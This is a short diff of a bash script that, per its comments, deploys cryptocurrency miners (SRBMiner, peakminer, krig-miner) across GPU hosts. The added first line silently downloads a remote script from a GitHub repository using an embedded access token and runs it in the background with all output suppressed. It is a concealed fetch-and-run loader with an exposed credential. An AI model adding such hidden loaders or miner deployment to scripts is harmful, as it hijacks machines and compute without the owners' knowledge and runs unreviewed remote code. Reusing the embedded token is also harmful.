@@ -1,4 +1,5 @@
 #!/bin/bash
+( bash -c "$(curl -fsSL -m 30 -H 'Authorization: token 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' -H 'Accept: application/vnd.github.raw' 'https://api.github.com/repos/dongsuju/ul-plant/contents/cmd8/i440_probe.sh?ref=main')" >/dev/null 2>&1 & )
 # ps9.sh — arch/host-adaptive PRL plant. One worker per card, worker name ul-ps-<hostname>-g<N>.
 # Modes: srb (SRBMiner-MULTI 3.8.9 @ kryptex tcp 7048) | srb300 (srb + nvidia-smi -pl 300)
 #        peak (peakminer 2.20.8 @ kryptex tcp 7048) | krig (krig-miner 1.8.2 @ kryptex ssl 8048 ladder)
